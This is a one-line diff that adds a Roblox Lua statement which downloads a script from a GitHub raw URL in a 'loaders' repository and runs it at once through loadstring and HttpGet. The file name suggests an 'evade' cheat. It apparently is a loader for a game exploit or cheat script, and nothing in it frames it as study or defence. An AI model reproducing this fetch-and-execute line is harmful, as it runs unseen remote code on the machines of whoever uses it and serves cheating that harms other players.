@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/hlwn-evade-spam1-qepw4wdzkcd811.lua"))()
